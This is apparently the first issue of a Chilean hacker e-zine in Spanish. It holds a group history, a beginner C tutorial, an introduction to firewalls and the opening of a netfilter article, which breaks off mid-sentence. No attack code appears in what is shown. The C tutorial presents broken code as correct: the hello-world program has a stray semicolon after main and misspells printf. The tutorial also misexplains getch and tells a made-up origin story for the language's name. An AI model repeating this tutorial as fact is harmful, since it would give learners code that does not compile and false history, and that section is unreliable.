#include <stdio.h>
main();
{
   prinf("Cultura Digital Team");  
   

/*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||@
@|||||||||||||||||||||||||||· = Cultura Digital Team · =||||||||||||||||||||||||||||||||||@
#@|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||@#
##@|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||@##
###&%%%&|&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&|&%%%&###
[!CDT#CD?T#CDT#CDT#CDT?#?CDT#CDT#CDT#CDT?#CDT#CDT#!]
[!CDT#CD?T#CDT#CDT#CDT?#?CDT#CDT#CDT#CDT?#CDT#CDT#!]
[!CDT#·CD         T#CDT#CD      DT#CDT#C                     #·CDT#!]
[!CDT#·C             #CDT#CD        T#CDT#C                     #·CDT#!]
[!CDT#·     #       CDT#CD         T#CDT#C                     #·CDT#!]
[!CDT#·     #C      CDT#CD   #C    #CDT#CDT#       CDT#·CDT#!]
[!CDT#C      #CDT#CDT#CD   # C    #CDT#CDT#       CDT#CCDT#!]
[!CDT#D      #CDT#CDT#CD   #       CDT#CDT#       CDT#DCDT#!]
[!CDT#T      #CDT#CDT#CD   # C    #CDT#CDT#       CDT#TCDT#!]
[!CDT#·     #C      CDT#CD   #C    #CDT#CDT#       CDT#·CDT#!]
[!CDT#·     #       CDT#CD         T#CDT#CDT#       CDT#·CDT#!]
[!CDT#·C              CDT#CD        T#CDT#CDT#       CDT#·CDT#!]
[!CDT#·CD         T#CDT#CD      DT#CDT#CDT#       CDT#·CDT#!]
[!CDT#CDT#CDT#CDT#CDT#CDT#CDT#CDT#CDT#CDT#CDT#!]
[!CDT#CDT#CDT#CDT#CDT#CDT#CDT#CDT#CDT#CDT#CDT#!]
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*/

getch();
}


					  Numero "0"

			     Pro dominio: http://www.culturadigital.cl 

		    	        E-Mail: cdt_911@hotmail.com

		              Canal oficial #cdt /server irc.cl




=============================================================================================
=============================================================================================


   
				       ·= DISCLAIMER =·
				         IIIIIIIIIIII 

    Cultura Digital Team no se hace responsable por el mal uso que le puedas llegar a dar 
     a los textos aca expuestos en esta magazine, ya que algunos de estos textos llevados
      a la practica pueden llegar a resultar ilegales, pero que quede bien claro que 
        incitar a la ilegalidad no es el fin que nos mueve a si es que cae bajo tu
                    mera responsabilidad lo que hagan con esta magazine. 


      A nacido un nuevo grupo de underground chileno que ha decidido lanzar una e-zine
      con el unico proposito de informar y dar a conocer este mundo y expresar a traves 
       de nuestras ideas y pensamientos que no somos unos criminales pero si unas mentes 
        inquietas que buscan el saber de los sistemas informaticos dia a dia y si por 
         saber mas que el resto, buscar, hurgar en busca de la informacion, por 
          existir sin color de piel, de tendencias politicas e informar a la 
           sociedad de lo que esconden los timan de delincuentes alla ustedes
            nuestras conciencias estan tranquilas y nuestras mentes listas 
   				    para seguir aprendiendo.


		   ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
		      Por cosa de desconfiguraciones no escribimos con acentos 
		   ||||||||   Editor recomendado: Edit del DOS   ||||||||||||||||
			  ||||||||||||||||||||||||||||||||||||||||



			        ·= Staff Cultura Digital Team =·
 				  IIIIIIIIIIIIIIIIIIIIIIIIIIII 


				      _Alphaice_    Bitburner 

				      [EL_CoNaN]    yuyox
					
				      Nacho23  	    Nec 


Bienvenido Nec, a nombre de todos el grupo te damos la bienvenida al team, te deseamos lo
mejor y que crezcas junto con nosotros, tienes nuestro apoyo y acogida, bienvenido al mundo
de adeveras dijo el huaso ejeje hay que hacer la cucha pa las chelas digo yo pa celebrar 
jeje...



 				          ·= Saludos =· 
					    IIIIIIIII


	           Proyecto R **************************** http://www.cdlr.org
   	           Electron Security Team **************** http://www.est.cl
                   Zine Store **************************** http://www.ezine-store.com.ar
                   Underlock ***************************** http://www.Underlock.com
	           Hackindex ***************************** http://www.hackindex.org
		   Orion Team **************************** http://www.otv.org.ve
		   Undersec Secutity Team **************** http:/www.undersec.com
		   Systat Security Team ****************** http:/www.systat.cl
		   Elhacker ****************************** http:/www.elhacker.net
	           




Colaboradores CDT
IIIIIIIIIIIIIIIII

• Bogu5



INDICE ======================================================================================
By Editor Cultura Digital Team ==============================================================
=============================================================================================


1  •- Introduccion *********************************************** By Editor
2  •- Editorial ************************************************** By Editor
3  •- Historia del team ****************************************** By [EL_CoNaN]
4  •- Programacion en C ****************************************** By _Alphaice_  
5  •- Introduccion a firewalls de redes ************************** By _Alphaice_
6  •- Netfilter ************************************************** By [EL_CoNaN]
7  •- El amigo Nmap ********************************************** By [EL_CoNaN]
8  •- Como montar un Firewall en GNU/Linux *********************** By Nacho23
9  •- Sistema de Ficheros Distribuidos Coda ********************** By BoGu5
10 •- Introducciona linux **************************************** By _Aphaice_
11 •- Bug y explois ********************************************** By CDT
12 •- Noticias del mundo underground chile y el mundo ************ By CDT
13 •- Proyectos CDT ********************************************** BY CDT
14 •- Agradecimientos ******************************************** By Editor
15 •- Despedida ************************************************** By Editor



1. Introduccion =============================================================================
By Editor Cultura Digital Team ==============================================================
=============================================================================================

1, 2 y 3 comenzamos :P aca lanzamos y damos a conocer nuestro proyecto y forma de exprecion,
esto que ven plasmado aca es una magazine informatica y chilena y ojala que con el tiempo 
vallamos captando lectores y mejorando cada ves mas esta e-zine. Asi como los buenos vinos 
que exporta chile porque no podemos tambien exportar conocimientos y tratar de hacer un poco 
mas conocido o difundido todo esto. Todo sea por el bien de esto tan preciado  para algunos 
y algo desconocido para otros, si señores pretendemos ser la voz de los sin voz y transformar 
este proyecto en una muy buena experiencia que nos sirva a nosotros y a ustedes para a si ir 
creciendo dia dia en esto llamado underground, bueno damas y caballeros les presentamos 
producto chileno para el mundo :P.

Esta magazine teniamos proyectado que saliera por ahi por los meses de noviembre, por cosas 
de estudios y el no contribuir con buenos textos los atraso un poco, en primer intancia 
teniamos lista la magazine pero resulto que no era del 100% apta para ser llevada al mundo 
de inet ya que no teniamos preparado un buen material digno de decir y de exponer y al 
conversar con los integrantes del grupo decidimos ponernos las pilas y mostrar lo que ahora 
estamos presentando. Esperamos que con el tiempo nuestras publicaciones se vallan mejorando 
cada ves mas para que contribuyamos en algo a todos ustedes y asi tambien crecer y tener 
una buena experiencia de todo esto asi que a su salute le presentamos la magazine de Cultura 
Digital Team, epero que les guste y sirva de algo todo lo que aca exponemos. Para cualquier 
contacto que quieran realizar esta nuestro mail cdt_911@hotmail.com ya sea para colaborar
con el grupo, hacernos llegar sus criticas, apoyos o lo que se te ocurra hacerlo el mail 
señalado.

No es nuestra intencion copiarle a nadie ni dañar en inet todo esto que exponemos aca esta 
echo con el unico fin que nos mueve y en cual se basa CDT que son el informar y dar a 
conocer la cultura digital a traves de nuestra forma de expresion, al que le guste bueno y 
al que no tambien se le respeta, todos somos libres de elegir y tener nuestras inclinaciones 
por cosas ya sea en este caso una revista informatica que queremos que se desarrolle de la 
mejor manera posible para todos ustedes. No es nuestro fin ganar fama o dinero con esto, no 
esta en en nuestras mentes lucrar, esto es una institucion jeje sin fines de lucro señores.

Bueno para terminar aca abarcaremos diferentes temas como los que expondremos en nuestra
primera entrega que son  programacion en C, netfilter, introduccion a firewalls de redes y 
otras cosas mas que trataremos de explicar en nuestra magazine.

Nota:
=====

Mau por fin vas a poder subir la e-zine a la web mis disculpas pero valio la pena el atraso
ya que mejoro mucho la magazine, gracias por la paciencia y por contribuir con tu web a 
difundir el mundo underground hispano parlante se le agradece por dejar nuestra magazine en
tu web y asi difundirla un poco.


			conan founder de cultura digital team.



2. Editorial ================================================================================
By Editor Cultura Digital Team ==============================================================
=============================================================================================

Hola Chile y sus alrededores, llego la hora de gozar, si damas y caballeros estamos aqui
entregando este, nuestro primer numero algo tarde pero no imposible como dicen por ahi. Me 
presento soy conan y pa variar me toco ser el editor de este nuestro primer numero "0", aca
estamos sacando esta magazine que espero vengan muchos numeros mas y que esto no se quede en
un proyecto solamente ya que quiero y queremos ver realizado a CDT en el futuro en un grupo
unido y que a traves de nuestra forma de expresion demos a conocer todo este mundo llamado 
underground. A nombre de todos en el team le doy la bienvenida a esta aventura que hemos 
decidido emprender y como un amigo del team decia por ahi ""hoy en dia esta naciendo un tipo
nuevo de cultura y esa es la famosa cultura digital y esto se debe a un mundo que se esta
llenando de computadores haciendoce cada ves mas computarizado y nuestra mision es aprender 
a darles un uso logico dentro de esto podemos hablar del under o lado oscuro  de la 
informatica eso es a lo que dedicamos esta magazine y a ese mundo de posibilidades" que 
palabras sabias no buena _Alphaice_, jejej co editor :P. Con esto buscamos cambiar la forma 
de como piensan de los llamados hackers ya que mucha gente confunde hackers con piratas en
anonimato detras de un nick haciendo cosas malas por inet o como cibercriminales, pero eso
no es asi. Bueno lo que hacemos aca en este grupo esta muy cerca de lo que se conoce como
verdaderamente como hackers con eticas y conocimientos que jamas utilizariamos para hacer
daño a nadie.

Aprovechando que estoy inspirado tambien mando un mensaje a los grupos que quizas con otra
mentalidad pero con los mismos fines dan a conocer el under como lo son en chile: Proyecto
R, Electron Security Team, Systat Security Team ( systas vuelvan pronto y saludos ), FYE.
A todos no se duerman y saquen nuevas publicaciones, tienen todo el apoyo de estos humildes
servidores y a tirar esto para arriba, saludos a todos y arto aguante y suerte en todo.

Cultura Digital Team....



3. Historia del team ========================================================================
By [EL_CoNaN] fUll Disclousure ==============================================================
=============================================================================================

La historia de CDT  empezo como un proyecto, como todo empieza pero esto me quitaba el
sueño y tenia ideas vagas en mi cabeza. Hace ya un tiempo que venia tramando esto :-), todo
esto empezo una noche en la cual estaba en inet  mirando algunas paginas de informatica y 
una que otra cosita por ahi, cuando de repente se me enciende la ampolleta y me viene un
un pensamiento y una inyeccion de ideas. No se pregunten porque veia a proyecto R como 
evolucionaba a trabes del tiempo y tambien otros grupos mas y me dije porque no formar un 
grupo el cual ayude a dar a conocer mas el underground y asi decirle a la gente a traves de
nuestras mentes, ideas y pensamientos que no somos unos criminales pero si unas mentes 
inquetas por aprender cada dia mas. Y asi al pasar las horas paso la noche a ya parece 
cancion :-) y llego el dia, me levante con esas ideas en la cabeza y me fui para la U a 
clases. Estando en el laboratorio de informatica se me ilumino mas la ampolleta :-), el 
pensamiento vino, me puse a conversar con un compañero de la U el _AlphaIce_, yo sabia que 
al man le gustaba todo este mundo llamado under y le propuse que formaramos un grupo y le 
di a conocer mis ideas y el proyecto que habia planeado y el lo hallo muy bueno. Me dijo 
que enseguida empezaramos a darle curso y hacer realidad el proyecto. En eso los pusimos 
a buscar un nombre para el grupo, el cual nos costo un poco hallar un nombre que nos 
representara y a la ves se viera bien, yo tenia la idea de algo chileno y que sonara bien, 
pero pero la idea del nombre salio una noche de carrete en la casa del  del _AlphaIce_.
Estabamos conversando, yo estaba medio curadito  y el _AlphaIce_  sano y le dije algo asi
"sabes _AlphaIce_ aca en chile no hay una cultura digital bien formada”, y el _AlphaIce_ la 
queda pensando y me dice cultura digital ahi esta el nombre y sap quedo por Cultura Digital
Team, miren como salen las cosas a :-). Bueno despues de eso creamos un canal el cual tiene 
por nombre #cdt esta en el server irc.cl para hacer de el un punto de encuentro a las mentes 
inquietas y buenas  personas que se nos unirian a medida que pasara el pasara el tiempo y
conocieran el proyecto, no me equivoque; en un principio empezamos el _AlphaIce_ y yo
[EL_CoNaN] y luego se nos fue uniendo gente. Uno de los primeros en unirse despues que le 
dimos a conocer el proyecto fue el Nacho23 gran valor, despues se fueron integrando mas con
el pasar del tiempo como lo son Bitburner, yuyoX y recientemente Nec. Grandes personas 
gracias a ellos esto va tomando fuerzas y se va haciendo realidad de apoco cada dia que pasa.
Gracias chicos por apoyar y tener en nuestras mentes algo en comun que es el underground. Ya
que cada uno que integra el grupo tiene cualidades e intereses diferentes como la seguridad
informatica, hacking, redes, etc. Trataremos de hacer lo mejor posible y dar a conocer el 
llamado lado oscuro de la informatica a traves de nuestra forma de expresion.

Para terminar la historia cultura digital team tiene grandes proyectos que se iran 
concretando y que ustedes al pasar del tiempo veran, sabemos lo que somos capaces de hacer 
y nuestras mentes estan tranquilas por que no ronda el mal, si el informar y dar a conocer
la cultura digital.

Pensamientos e ideas que invaden las mentes y proyectados en un grupo llamado cultura 
digital team.



4. Programacion en C ========================================================================
By _Alphaice_  [From the DarkStar of DarkSide]...por una Cultura Digital=====================
=============================================================================================

Bueno para empezar les contare algo  del lenguaje, este fue desarrollado en el año 1972 
por Dennis Ritchie para el sistema operativo UNIX, ahora te preguntaras porque se llama asi,
bueno hace un tiempo los desarrolladores estaban buscando el sistema operativo perfecto e
hicieron proyectos cuyos nombres fueron: Proyecto "A", Proyecto "B", hasta que finalmente 
lograron lo que tanto buscaban y lo llamaron Proyecto "C", este lenguaje es conocido por su 
rigidez y por ser estructurado y ha perdurado en el tiempo por su conocida reputacion que si 
bien no satisface a todos, son muchos los que lo consideran como un avance unico en la 
computacion (que lindo escribo, no creen??? :p). Un ejemplo de lo poderoso que puede ser es 
que algunos de los sistemas operativos han sido hechos con C como por ejemplo 
"Minix" (uno de los padres de Linux).

Pasando a otro tema, te haz hecho esta preguntita... no tengo C de donde %&$ lo saco???, 
excelente pregunta, si estas trabajando con Windows tienes que bajarlo desde Inet puedes 
buscarlo en algun buscador poniendo compilador c para windows o "bajar Turbo C" pero si 
estas trabajando en Linux tendras que tenerlo instalado.

Ok, llego la hora de la fiesta, o sea, comenzar a aprender de este tan entrenido lenguaje.
Para que entiendas mejor este lenguaje te voy a dar un ejemplito algo tonto pero al punto.
---------------------------------------------------------------------------------------------
#include <stdio.h>
main();
{ 
   prinf("Hola Mundo");   /*Esto es un comentario*/
   getch();
}  

---------------------------------------------------------------------------------------------

Este es un pequeño ejemplo de C, ahora lo explicare linea por linea...


#include <stdio.h>    

Esta es la libreria que usa, este lenguaje consta de librerias o funciones que deben ser 
puestas junto al compilador o deben estar en tu pc y son pequeños trozos de codigo y son para
no hacerte la vida complicada escribiendo el mismo trozo de codigo cada vez que tienes que 
hacer algo. estos siempre deben estar en el programa que vas a hacer o sino no funciona.


main();


Tambien es una funcion y debe ir en los programas que escribas, tambien es acompañada de la
palabra void, de la siguiente manera:  void main(); Ahora los dos puntos simpre deben ir 
despues de cada linea de codigo, a veces no deben ir pero eso lo aclararemos mas adelante.


{

Facil es el comienzo del programa.


   printf("Hola Mundo");

Esto es hacer imprimir en pantalla, lo que aparece entre comillas es lo que se visualizara 
en pantalla.


/*Esto es un comentario*/

El mismo lo dice, cuando queremos escribir algo pero que no lo tome en cuenta el compilador
como linea de codigo esto son comentarios donde escribes lo que quieras.


getch();

Es una funcion de para visualizar en pantalla.

}

El fin de un programa.

---------------------------------------------------------------------------------------------

Facil o no... bueno, ahora voy a enseñarles algunas cosillas basicas para empezar a programar
en C.


Tipos De Datos:
===============

Para quienes no tengan experiencia en programacion los tipos de datos se refieren a que tipo
de datos podemos usar para nuestro programa y ademas estos deben ser definidos al comenzar 
el programa, ejemplo, si necesitamos un caracter lo definimos como un dato tipo "Char".

Aqui estan algunos de los tipos de datos que existen en c.

Enteros        :  Int
Fraccionario   :  Float
Caracter       :  Char
Fraccionario de doble presicion  :  Double

Estos les servira para declarar variables, si no entienden les dare un ejemplo

int area, volumen;  ----->  estamos declarando las variables area y volumen como
                            un dato de tipo entero.


Variables:
===========

Una variable es un identificador que se utiliza para representar cierto tipo de informacion
dentro de una parte determinada de un programa.

Ejemplo:

main();
{
   int a, b, c;    ------> aqui estamos declarando variables
   a=3;            ------> las variables toman valores para ser usados
   b=2;
   c=a+b;          ------> aqui usamos una variable para guardar el resultado de
}                          la interaccion de las dos variables.



Operadores Relacionales y Logicos:
==================================

En C existen 4 operaciones relacionales, los cuales son, <,<=,>=,>, que son usados para 
hacer comparaciones logicas, otros de estos operaciones muy relacionados son los operadores 
de igualdad.

== igual a.
!= no igual.


Bueno chicos y chicas (si las hay je je je) hemos llegado al final de la primera parte de
este manualcillo de bolsillo jejeje, en el proximo capitulo aprenderemos cosas como 
sentencias de control como los famosos while o los ciclos if, pero no me ire sin antes
dejarles un programilla de tarea para la casa.  Compilenlo y vean lo que hace.


#include <stdio.h>
main()
{
   float fahr,cel;
   int sup,inf,paso;
   inf=0;
   sup=300;
   paso=20;
   clrscr();
   fahr=sup;
   printf("Fahr  Celsius\n");
   do
   {
     cel=(5.0/9.0)*(fahr-32);
     printf("º  %3.0f\t%6.1f º\n",fahr,cel);
     fahr=fahr-paso;
     } while (fahr>=inf);
     getchar();
}

Despedida:
==========

Bueno ahora me despido finalmente diciendo portense bien estudien y practiquen.


_AlphaIce_ "Dicen que la sabiduria pesa, tambien lo dice mi espalda". 



5. Introduccion a firewalls de redes ========================================================
By _AlphaIce_ Por una Cultura Digital  [the Darkstar, from the darkside] ====================
=============================================================================================

Hola a todos!!! soy el _AlphaIce_ uno de los pesotes del grupo y vengo a enseñar y no  a
a vender... jejeje,  no cabros, bueno me dedico a estudiar, estudiar y estudiar, se lo que 
es el peso de un libro, jejeje, cosa que el CoNaN no conoce, jaja, it's a joke!!!. Ya los
dejo para que lean de este documento que esta muy bueno, consultas al correo del grupo
/* cdt_911@hotmail.com */ por mientras, ok.

Bueno en esta entrega del primer numero de nuestra e-zine voy a explicar simple y brevemente
lo que es una Firewall para los novatos y para quienes no tienen una gran nocion de esto.

Introduccion:
=============

Para empezar vamos a traducir la palabra Firewall (cosa facil, claro), bueno, fire en ingles
es fuego y wall es pared, juntandolo, la palabra es "Pared de Fuego", a veces tambien le 
dicen "corta fuego" pero en fin la cosa es la misma.

Basicamente un firewall es un sistema de seguridad que bloquea accesos a una red, como vimos
hace un rato en la traduccion son paredes que se encuentran a la entrada de una red, bueno
asi es recomendado, ya que se puede posicionar en el lugar que uno desee. Los Firewalls son
productores de una politica de seguridad en una red interna ya que este tiene el fin de 
bloquear los accesos desde afuera y de limitar los servicios usados tanto desde afuera como 
desde adentro esto lo hace cerrando puertos y tomando otras politicas mas que son hechas a
gusto del programador o del administrador de la red configurandolas internamente.


Aspectos fisicos de un Firewall:
================================

Llego la hora de explicar la forma fisica de un firewall, para los que no saben, por 
supuesto, me imagino que han escuchado o visto en paginas que los pueden instalar o bajar 
desde desde inet, pero fisicamente los firewalls son dispositivos que se los venden en 
cualquier proveedor de hardware, las pueden encontrar en el mercado pero sus precios son 
algo elevados asi que no les recomiendo que piensen en eso si no tienen un buen billete,
jejeje :), por ejemplo en la Universidad donde estudio compraron hace un tiempo un firewall
y por lo que supe los costos fueron de uno $400.000.- pesos (Chile), por un pequeño artefacto 
que nos promete proteger la red universitaria, pero si no quieres gastar una enormidad de 
dinero puedes comprar  algun programa/firewall (crees que es enredado, no importa ya 
explicare de que se trata en detalle) hay en el mercado muchos utiles para llegar e intalar, 
ahora si este signo "$" es un virus para tu bolsillo entonces te recomiendo que te bajes uno
de inet, los hay gratis y son muy buenos.

Bueno despues de hacerte sufrir con la cosa de los costos te preguntaras porque existe un 
aparato que cuesta mucho $$$ si puedo bajar uno de inet que haga lo mismo e instalarlo en 
el pc, es facil, esto es porque el mismo pc donde instalas el firewall es como el aparato
pero lo diferente es que el aparato solo cumple la funcion para la cual fue hecho o sea un
firewall y en cambio si instalas el software en el pc lo estas convirtiendo en el firewall.
En realidad siempre es mas confiable (aunque caro) comprar el aparato por la simple razon es
que el pc es mas vulnerable a ataques y al desgaste como tambien a la caida del sistema, etc.

Bien ahora pasare a explicar un poco mas detallado a estos dos como van fisicamente 
conectados; Tanto el F/aparato, y el F/programa, estos se conectan generalmente o mas bien 
dicho recomendadamente a la salida a inet para que la seguridad sea eficiente obvio. Pero
tambien puedes tener mas de uno asegurando parte de la red por secciones, eso es mas que 
nada para empresas grandes que pueden darse ese lujo, pero si tu tienes una pequeña red con 
un server que sale a inet te recomiendo que lo pongas en la puerta.


Politicas de Seguridad, creando un perimetro de defensa:
========================================================

En este punto de gran importancia ya estamos pasando a la parte fuerte del plato o mas bien
dicho a la parte donde aprenderemos la utilidad de una firewall en nuestra red.

Debo comenzar diciendo que los firewall no son ruteadores ni servers de defensa, ni la la 
herramientas para desacerte de los huespeds no invitados, no, nada de eso, lo que es en 
realidad es parte de una politica de segurdidad que debe hacerse y mantenerse dentro de una
red, podemos decir que es parte de un perimetro de seguridad, pienselo de esta manera, por
ejemplo un banco, crees tu que si el banco no tuviera su politica de seguridad fuera este
tan seguro (bueno casi, jejeje) como para confiarles tus ahorros, ellos tienen varias 
medidas de seguridad y eso obedece tanto en crearla, mantenerla y mejorarla, es igual que 
una red nosotros no debemos confiarnos solo del firewall para la seguridad de nuestra red, 
sino que debemos establecer una politica y asegurarnos que todos los usuarios la cumplan, 
esto nos ayuda para que a futuro no tengamos que lamentar algun tipo de saqueo digital.

=============================================================================================
            		 __________________________
                        (                          )
		       (                            )     Aqui esta un pequeño esquema      
		      (           Internet           )    de de un perimetro de defensa
                       (                            )     para que vallan entendiendo lo 
                        (____________^_____________)      que antes explique.
		       	            / \
                                    | |
                                    | |
                  *****************************************************************
                  *                 | |                                           *
                  *              **********                                       *
                  *             [ Firewall ]                                      *
                  *              **********                                       *
 ************     *                 | |          Red Interna      ______________  *
 * Perimetro ---> *                 | |          -----------     /              | *
 * de defensa---> *             ____\ /_____                    /               | *
 ************     *            *            *                  / Computadores   | *
                  *           *    SERVER    * -------------> /  o nodos perte- | *
                  *           *              * <------------- \  necientes a una| *
                  *            *____________*                  \     red        | *
               	  *                                             \               | *
                  *                                              \______________| *
                  *                                                               *
                  ***************************************************************** 
=============================================================================================

Bueno las politicas de seguridad, se las dejo a ustedes para que las discutan y vayan desde
ya viendo las necesidades de seguridad en su red para crear un perimetro de defensa, bueno
como tarea para la house.


Beneficios de un Firewall:
==========================

-Los firewalls en inet permiten administrar los accesos posibles a una red permitiendo al 
administrador de la red definir un "Choke point"---> un embudo, manteniendo a margen a 
cualquier intruso que se nos quiera colar en nuestra red y restringiendo el acceso desde 
fuera a solo algunos usuarios, vulnerando algunos servicios logrando asi proteccion para
varios tipos de ataques, una de las grandes ventajas de tener un firewall en inet es que
ayuda a simplificar la administracion de la red.

-Nos da la facilidad de monitorear la seguridad de nuestra red y si en esta aparece algo 
sospechoso; este beneficio es un gran aporte ya que aqui podemos asegurarnos sobre alguna 
malversacion de parte de un atacante ya que sabriamos por donde esta entrando y las medidas
a tomar, o sea que tenemos el control de la entrada y la salida, es como poner una camara
en la entrada de tu casa, tendras monitoriada la entrada y sabras si alguien extraño esta 
por ahi. Frente a lo anterior este nos avisa cuando tenemos un ataque. Ademas este 
dispositivo nos permite el eficiente control del uso de internet, para los gastos, jejeje :).

Entre otras cosas y en general los beneficios de esta en resumidas cuentas son que:

-Concentra la seguridad.
-Centraliza los accesos.
-Genera alarmas de seguridad Traduce direcciones NAT (Network Address Translator).
-Monitorea y registra el uso de Servicios de WWW y FTP.


Las limitaciones y vulnerabilidades de los Firewalls:
=====================================================

Bueno no todo puede ser de maravilla o no, jejeje ;).  Como lei en el libro que me regalaron
(no pregunten...), "Firewalls and Internet Security"; Axiom 1 (Murphy) all programs are buggy
---> (Murphy) Todo programa tiene un bug, y asi tambien toda seguridad en redes lo tiene, 
gracias a Dios por eso jejeje ;)!!!. 

-Para empezar, una de vulnerabilidades de los Firewalls puede venir de algun traidor que 
 trate de hacer caer nuestra red, para eso tenemos que tratar, dentro de la politica de 
 seguridad lo cual vimos anteriormente, de no dar atributos de super usuario (Root, en los 
 sistemas operativos Unix y Linux) o de usuarios administrativos a quienes no les tengas la 
 confianza suficiente como para darles acceso al servidor.

-Los firewalls no pueden protegerse de los ataques que se realizen fuera de su punto de 
 control, a que me refiero con eso?, es que algun usuario puede lograr abrir un agujero 
 mediante una conexion Dial-out que permita la entrada a nuestro perimetro de seguridad, el
 usuario puede hacer una conexion SLIP o PPP al internet. Este tipo de conexiones logran 
 pasar la seguridad del firewall, creando una puerta de ataque.

-El firewall no puede protegerse de de la ingenieria social, ya sabes, de hackers o crackers
 (dificil los Lamos, no se atreverian), que fingen ser un supervisor o algun otro personaje 
 de la vida real.

-Como dije anteriormente el firewall no se puede proteger por algun factor interno por 
 ejemplo, algun virus, software defectuoso, archivos defectuosos o desconfiguraciones 
 producias por algun usuario, etc.

-Finalmente, el firewall de Internet no puede protegerse contra los ataques posibles en la 
 la transferencia de datos, estos ocurren cuando aparentemente datos inocuos son enviados o
 copiados a un servidor interno y son ejecutados despachando un ataque. Por ejemplo, durante
 una trasferencia de datos podria causar que el servidor modificara los archivos relacionado
 a la seguridad dando una potencial entrada a los intrusos.

-Cuando algun intruso logra pasar las barreras del firewall no hay nadie que este ahi para 
 hacer algo, podemos estar en manos libres de los intrusos para tomar el poder del server,
 o sea que nos tomen por asalto completamente y si no hay nadie ahi podemos decirle adios a
 nuestra red. Este no es una falla del firewall sino que es por parte del administrador de la
 red, asi que cuidado con eso.


Bueno como pudimos ver todo tiene su vulnerabilidad, pero no te asustes, mientras sigas los
consejos de la politica de seguridad no vas a tener que preocuparte por esto.


Componentes de un Sistema de Firewall:
======================================

Aqui solo resumire nombrandolos, ya que dejare para otra ocacion sus definiciones.
Los firewalls tipicos se componen de uno o una convinacion de estos.

-Ruteador Filtra-paquetes.
	-Gateway a Nivel-aplicación.
	-Gateway a Nivel-circuito.



Despedida:
==========

Bueno aqui me despido hasta la proxima entrega de nuestra e-zine donde explicare a fondo los
componentes del firewall y ademas hablare de algunas cosillas de seguridad en los firewalls
para terminar con  esta introduccion a los firewalls, ok. Me despido hasta la proxima.

_AlphaIce_ 2002 {the DarkStar, from the darkside}.



6. Netfilter ( Sitema de filtrado de paquestes en el kernel "2.4.x") ========================
By [EL_CoNaN] fUll Disclousure ==============================================================
=============================================================================================

1.0 Introduccion
1.1 Que es netfilter
1.2 Historia de netfilter 
1.3 Porque usar netfilter
1.4 Tratando los paques a traves de netfilter
1.5 Programando un modulo netfilter con ganchos
2.0 Programacion en iptables 
2.1 Libreria libiptc
2.2 Conociendo los socket buffer (skb's)
2.3 Como se establece una conexion
2.4 Iptables (cadenas y formatos)
2.5 Comandos basicos 
2.6 Parametros
4.0 Despedida

1.0 Introduccion: 
=================

Hola a todos, espero esten difrutando de la magazine, bueno en este apartado voy a tratar el 
tema netfilter lo voy a intentar explicar de la forma mas facil para que asi comprendan en 
si lo que es netfilter para que les sirva de algo todo lo que vamos a plantiar aca.

Recomiendo ponerce comodos jeje, puede ser con un buen cafesito o una chelita, ustedes ven
ahi jeje. Para que le saquen el mejor probecho a este tema pueden leer otros txt asi para que
no se queden con solo una vercion de los hechos :-). Para cualquier duda o lo que sea me 
puedes encontar en el canal #cdt del server irc.cl o me envias un mail a cdt_911@hotmail.com,
bueno depues de lo dicho solo los queda adentranos en el tema que trataremos ahora llamado
netfilter...


1.1 Que es netfilter?:
======================

Hmmmm buena pregunta a jeje, deja preguntarle a mi cabeza haber hmmm, Netfilter es un sistema
de filtrado de paquetes que se encuentra dentro del kernel fuera de la interfaz normal de 
sockets de Berkeley y fue completamente implementado sobre 2.4, se puede decir que es una 
infraestructura que va a encargarse del filtrado de paquetes y NAT a traves de diferentes 
hooks (ganchos). Netfilter viene definido segun cada protocolo, por ahora se encuentra en 
ipv4, ipv6 y DECnet y dependiendo de su protocolo definira una serie de hooks (ganchos) y 
dependiendo de su protocolo  o ganchos que van implementados en la pila del protocolo, asi 
dependiendo de cada gancho entonces se podra realizar el  tratamiento del paquete. 

Netfilter consta de tres partes que son las siguientes:

1 Estructuras del kernel que se van a encargar de escuchar a los diferentes ganchos de cada 
  protocolo de manera que cuando el paquete atraviesa, netfilter lo comprobara y realizara 
  unas determinadas operaciones dependiendo del gancho por el que este pase y los hara 
  disponer en una cola para devolver al area de usuario.

2 Una serie de ganchos establecidos por el protocolo, un ejemplo sería ipv4 que establece 
  cinco ganchos que luego estudiaremos que estaran definidos en distintos transcursos del 
  viaje del paquete.

3 una vez que se dispone de la cola de paquetes, se envia al area de usuario y se podra hacer 
  la manipulacion, examinando, modificando o volviendo a mandar.

Una vez ya recibido el paquete, netfilter lo hara disponer en una cola de paquetes en la que 
posteriormente seran tratados. Mas adelante explicare mas detenidamente como lo hace el kernel 
internamente ahora explicare las diferentes politicas de filtrado de paquetes que son las dos 
siguientes la de aceptar todo por defecto y luego ir cerrando los puertos segun te convenga o 
bien adoptar la politica mas segura, que es la de cerrar todos los puertos y abrir unicamente 
los de uso particular, en este caso debido a que muchos programas usan puertos aleatorios, se 
suelen dejar cerrados unicamente los puertos de uso comun,los inferiores a 1024, y dejar 
abiertos los publicos, pero bueno eso ya es cosa de cada uno.

Empezare comentando como funcionaba en kernel 2.2 cuando se usaba ipchains para saber como 
funcionaba todo esto. Una cosa importante es saber que las politicas de filtrado dinamicas 
no pertenecen al kernel. En el kernel 2.2 se introdujo una manera de hacer pasar los paquetes 
al espacio de usuario mediante netlink, pero la reinyeccion de paquetes era muy lenta, por lo 
que se empezo a pensar en otra forma de hacer mas rapida, bueno en lo referido a memoria mas
adelante seguire contando. 


1.2 Historia de netfilter:
==========================

El concepto de netfilter y la mayoria de su implementacion lo creo Rusty Russel, que es un 
kernel hacker, coautor de ipchains que a pesar de haber hablado con Alan Cox y de pensar 
que no era algo factible luego en un futuro, Alan Cox lo le convencio de que era un buen 
comienzo y convencido por este siguio su trabajo y ademas de introducir el concepto de 
